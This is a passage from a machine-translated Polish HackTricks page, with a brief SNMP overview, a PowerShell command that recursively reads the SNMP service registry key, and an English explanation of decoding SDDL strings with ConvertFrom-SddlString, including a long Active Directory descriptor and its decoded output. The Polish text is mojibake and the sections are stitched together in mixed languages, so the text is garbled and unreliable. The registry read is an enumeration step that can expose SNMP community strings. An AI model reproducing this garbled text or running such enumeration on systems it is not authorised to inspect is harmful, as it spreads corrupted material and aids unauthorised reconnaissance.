SNMP jest protoko≈Çem u≈ºywanym do zarzƒÖdzania i monitorowania urzƒÖdze≈Ñ sieciowych. Sk≈Çada siƒô z zarzƒÖdzajƒÖcego, agenta i MIB. Protok√≥≈Ç obs≈Çuguje r√≥≈ºne rodzaje zapyta≈Ñ, takie jak GET, SET, GETNEXT i GETBULK. Aby zabezpieczyƒá SNMP, nale≈ºy korzystaƒá z silnych hase≈Ç, kontrolowaƒá dostƒôp i rozwa≈ºyƒá u≈ºycie SNMPv3.
```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```
## **Konwertowanie ciƒÖgu SDDL na czytelny format**

To convert the SDDL string into a readable format, you can use the `ConvertFrom-SddlString` cmdlet in PowerShell. This cmdlet allows you to convert the Security Descriptor Definition Language (SDDL) string into an object that can be easily read and understood.

Here is an example of how to use the `ConvertFrom-SddlString` cmdlet:

```powershell
$sddlString = "O:BAG:BAD:(A;;0x1;;;S-1-5-32-544)(A;;0x1;;;S-1-5-18)"
$securityDescriptor = ConvertFrom-SddlString -Sddl $sddlString
$securityDescriptor
```

This will output the converted SDDL string in a readable format, showing the various access control entries (ACEs) and their corresponding permissions.

By using this cmdlet, you can quickly analyze and understand the permissions set in the SDDL string, which can be useful for troubleshooting or auditing purposes.
```powershell

PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)"
W≈Ça≈õciciel            : BUILTIN\Administrators
Grupa            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
(CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users:
SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
(Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
<details>

<summary><strong>Naucz siƒô hakowaƒá AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Je≈õli chcesz zobaczyƒá swojƒÖ **firmƒô reklamowanƒÖ w HackTricks** lub **pobraƒá HackTricks w formacie PDF**, sprawd≈∫ [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobƒÖd≈∫ [**oficjalne gad≈ºety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinƒô PEASS**](https://opensea.io/collection/the-peass-family), naszƒÖ kolekcjƒô ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Do≈ÇƒÖcz do** üí¨ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **≈õled≈∫** nas na **Twitterze** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siƒô swoimi sztuczkami hakerskimi, przesy≈ÇajƒÖc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori√≥w github.

</details>
